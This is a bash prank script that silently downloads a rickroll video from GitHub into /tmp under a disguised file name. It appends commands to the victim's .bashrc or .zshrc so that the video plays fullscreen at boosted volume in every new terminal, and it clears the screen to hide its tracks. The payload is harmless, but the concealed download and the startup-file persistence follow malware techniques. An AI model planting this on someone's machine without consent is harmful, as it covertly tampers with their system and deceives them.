# The rickroll video link to mp4, modify it if you want because this one is a little big (it may take time to download)
rickrollVideoLink="https://raw.githubusercontent.com/AinTEAsports/TerminalPrank/main/rickroll_144p.mp4"

# The output filename, modify it so the victim won't find it, I put it in /tmp so when rebooting, the prank goes away
outputFilename="/tmp/temporary.config"

# We download the video, '-q' stands for quiet download so there is no output, and '-O' is here for output filename
wget -q $rickrollVideoLink -O $outputFilename


# We set up the variable (the config file which is executed to every start of the terminal)
if [[ $SHELL == '/usr/bin/bash' || $SHELL == '/bin/bash' ]]; then
	shellConfigfile=~/.bashrc
elif [[ $SHELL == '/usr/bin/zsh' || $SHELL == '/bin/zsh' ]]; then
	shellConfigfile=~/.zshrc
else
	shellConfigfile=~/.${SHELL##*/}rc
	
	if [[ ! -f $shellConfigfile ]]; then
		echo -n "[!] Shell has not been recognized [!]"
		echo "Cleaning the screen in 3 seconds..."
		sleep 3
		clear
		exit 1
	fi;
fi;


# Writing the video filename as variable so we can remove it (easily)
echo "videoFilename="$outputFilename >> $shellConfigfile

# Writing the video execution in shell config file
echo "cvlc --qt-start-minimized --fullscreen --no-video-title-show --audio --gain 8 --quiet --no-interact --no-osd --video-wallpaper" $outputFilename "&" >> $shellConfigfile
echo "clear" >> $shellConfigfile


echo -n "[+] Operation finished, clearing the terminal in 2 seconds..."
sleep 2
clear

